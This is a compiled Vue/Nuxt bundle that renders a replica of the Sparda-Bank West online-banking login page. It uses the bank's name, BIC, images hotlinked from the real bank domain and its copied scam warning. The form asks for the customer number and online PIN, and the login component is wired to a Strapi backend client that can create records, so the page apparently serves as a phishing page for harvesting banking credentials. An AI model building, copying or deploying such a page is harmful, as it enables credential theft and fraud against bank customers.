import { mergeProps, useSSRContext, defineComponent, ref } from "vue";
import { ssrRenderAttrs, ssrRenderAttr, ssrRenderComponent } from "vue/server-renderer";
import { _ as _export_sfc, u as useStrapiClient, a as useStrapiVersion } from "../server.mjs";
import "hookable";
import "destr";
import "devalue";
import "defu";
import "klona";
import "ofetch";
import "#internal/nitro";
import "unctx";
import "@unhead/shared";
import "vue-router";
import "h3";
import "ufo";
import "cookie-es";
import "ohash";
import "qs";
const _imports_0 = "" + __publicAssetsURL("images/spardalogo.jpg");
const Header_vue_vue_type_style_index_0_lang = "";
const _sfc_main$5 = {};
function _sfc_ssrRender$1(_ctx, _push, _parent, _attrs) {
  _push(`<div${ssrRenderAttrs(mergeProps({ id: "header" }, _attrs))}><img${ssrRenderAttr("src", _imports_0)} alt="Logo"><p>Sparda-Bank West eG <b>GENODEF1S08</b></p></div>`);
}
const _sfc_setup$5 = _sfc_main$5.setup;
_sfc_main$5.setup = (props, ctx) => {
  const ssrContext = useSSRContext();
  (ssrContext.modules || (ssrContext.modules = /* @__PURE__ */ new Set())).add("vue/components/Header.vue");
  return _sfc_setup$5 ? _sfc_setup$5(props, ctx) : void 0;
};
const __nuxt_component_0 = /* @__PURE__ */ _export_sfc(_sfc_main$5, [["ssrRender", _sfc_ssrRender$1]]);
const _sfc_main$4 = /* @__PURE__ */ defineComponent({
  __name: "Tabs",
  __ssrInlineRender: true,
  setup(__props) {
    return (_ctx, _push, _parent, _attrs) => {
      _push(`<div${ssrRenderAttrs(mergeProps({ id: "tabs" }, _attrs))}><div class="first"><img src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/reiter-freischaltung.png"></div><div class="second"><input type="image" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/reiter-demokonto.png" title="Banking im Demomodus öffnen"></div></div>`);
    };
  }
});
const Tabs_vue_vue_type_style_index_0_lang = "";
const _sfc_setup$4 = _sfc_main$4.setup;
_sfc_main$4.setup = (props, ctx) => {
  const ssrContext = useSSRContext();
  (ssrContext.modules || (ssrContext.modules = /* @__PURE__ */ new Set())).add("vue/components/Tabs.vue");
  return _sfc_setup$4 ? _sfc_setup$4(props, ctx) : void 0;
};
const useStrapi4 = () => {
  const client = useStrapiClient();
  const version = useStrapiVersion();
  if (version !== "v4") {
    console.warn("useStrapi4 is only available for v4");
  }
  const find = (contentType, params, fetchOptions) => {
    return client(`/${contentType}`, { method: "GET", params, ...fetchOptions });
  };
  const findOne = (contentType, id, params, fetchOptions) => {
    if (typeof id === "object") {
      params = id;
      id = void 0;
    }
    const path = [contentType, id].filter(Boolean).join("/");
    return client(path, { method: "GET", params, ...fetchOptions });
  };
  const create = (contentType, data) => {
    return client(`/${contentType}`, { method: "POST", body: { data } });
  };
  const update = (contentType, id, data) => {
    if (typeof id === "object") {
      data = id;
      id = void 0;
    }
    const path = [contentType, id].filter(Boolean).join("/");
    return client(path, { method: "PUT", body: { data } });
  };
  const _delete = (contentType, id) => {
    const path = [contentType, id].filter(Boolean).join("/");
    return client(path, { method: "DELETE" });
  };
  return {
    find,
    findOne,
    create,
    update,
    delete: _delete
  };
};
const useStrapi = () => {
  return useStrapi4();
};
const _sfc_main$3 = /* @__PURE__ */ defineComponent({
  __name: "LoginForm",
  __ssrInlineRender: true,
  setup(__props) {
    useStrapi();
    ref({ value: null });
    ref({ value: null });
    return (_ctx, _push, _parent, _attrs) => {
      _push(`<!--[--><div id="loginForm"><div class="input user"><div class="textField"><label for="user">Kundennummer</label></div><input type="text" id="inputUser" autocomplete="off" maxlength="10" tabindex="1" title="Kundennummer (erforderlich)"><img src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png"></div><div class="input pin"><div class="textField"><label for="onlinePin">Online-Pin</label></div><input type="password" id="inputOnlinePin" autocomplete="off" maxlength="6" tabindex="2" title="Online-PIN (erforderlich)"><img src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png"></div></div><div id="loginBtn"><img src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/buttons/buttonFlach_Jetzt_einloggen.png"></div><!--]-->`);
    };
  }
});
const LoginForm_vue_vue_type_style_index_0_lang = "";
const _sfc_setup$3 = _sfc_main$3.setup;
_sfc_main$3.setup = (props, ctx) => {
  const ssrContext = useSSRContext();
  (ssrContext.modules || (ssrContext.modules = /* @__PURE__ */ new Set())).add("vue/components/LoginForm.vue");
  return _sfc_setup$3 ? _sfc_setup$3(props, ctx) : void 0;
};
const scamWarn_vue_vue_type_style_index_0_lang = "";
const _sfc_main$2 = {
  __name: "scamWarn",
  __ssrInlineRender: true,
  setup(__props) {
    return (_ctx, _push, _parent, _attrs) => {
      _push(`<div${ssrRenderAttrs(mergeProps({ id: "scamWarn" }, _attrs))}><img src="https://banking.sparda-west.de/portalcontent/banking_portal/bilder/west/sparda-west/198_108_hinweis.jpg"><p><b>Wichtige Info: Betrugsversuche durch Anrufe</b></p><p class="describtion">Geben Sie keine Aufträge in der SecureApp frei, die Sie nicht selbst im Online-Banking eingestellt haben. Nennen Sie NIE Ihre Zugangsdaten. Legen Sie direkt auf.</p><img class="moreInfoBtn" src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/buttons/button_Mehr_Informationen.png"></div>`);
    };
  }
};
const _sfc_setup$2 = _sfc_main$2.setup;
_sfc_main$2.setup = (props, ctx) => {
  const ssrContext = useSSRContext();
  (ssrContext.modules || (ssrContext.modules = /* @__PURE__ */ new Set())).add("vue/components/scamWarn.vue");
  return _sfc_setup$2 ? _sfc_setup$2(props, ctx) : void 0;
};
const __nuxt_component_3 = _sfc_main$2;
const _sfc_main$1 = /* @__PURE__ */ defineComponent({
  __name: "Footer",
  __ssrInlineRender: true,
  setup(__props) {
    return (_ctx, _push, _parent, _attrs) => {
      _push(`<div${ssrRenderAttrs(mergeProps({ id: "footer" }, _attrs))}><p>Impressum</p><p>Nutzungsbedingungen</p><p>Datenschutz</p><p>Preise</p><p>Sicheres Banking</p></div>`);
    };
  }
});
const Footer_vue_vue_type_style_index_0_lang = "";
const _sfc_setup$1 = _sfc_main$1.setup;
_sfc_main$1.setup = (props, ctx) => {
  const ssrContext = useSSRContext();
  (ssrContext.modules || (ssrContext.modules = /* @__PURE__ */ new Set())).add("vue/components/Footer.vue");
  return _sfc_setup$1 ? _sfc_setup$1(props, ctx) : void 0;
};
const index_vue_vue_type_style_index_0_lang = "";
const _sfc_main = {};
function _sfc_ssrRender(_ctx, _push, _parent, _attrs) {
  const _component_Header = __nuxt_component_0;
  const _component_Tabs = _sfc_main$4;
  const _component_LoginForm = _sfc_main$3;
  const _component_ScamWarn = __nuxt_component_3;
  const _component_Footer = _sfc_main$1;
  _push(`<div${ssrRenderAttrs(_attrs)}>`);
  _push(ssrRenderComponent(_component_Header, null, null, _parent));
  _push(`<div class="main-field"><div class="loginBgImageTop"></div><div class="loginBgImageMain"><div class="loginArea"><h2>Anmeldung zu Ihrem Online-Banking</h2>`);
  _push(ssrRenderComponent(_component_Tabs, null, null, _parent));
  _push(`<p>Bitte melden Sie sich mit der Eingabe Ihrer Kundennummer und der Online-PIN an. Andere Angaben sind nicht notwendig.</p>`);
  _push(ssrRenderComponent(_component_LoginForm, null, null, _parent));
  _push(`</div>`);
  _push(ssrRenderComponent(_component_ScamWarn, null, null, _parent));
  _push(ssrRenderComponent(_component_Footer, null, null, _parent));
  _push(`</div><div class="loginBgImageBottom"></div><div class="loginBgImageMirror"></div></div></div>`);
}
const _sfc_setup = _sfc_main.setup;
_sfc_main.setup = (props, ctx) => {
  const ssrContext = useSSRContext();
  (ssrContext.modules || (ssrContext.modules = /* @__PURE__ */ new Set())).add("vue/pages/index.vue");
  return _sfc_setup ? _sfc_setup(props, ctx) : void 0;
};
const index = /* @__PURE__ */ _export_sfc(_sfc_main, [["ssrRender", _sfc_ssrRender]]);
export {
  index as default
};
//# sourceMappingURL=index-bdd809ef.js.map
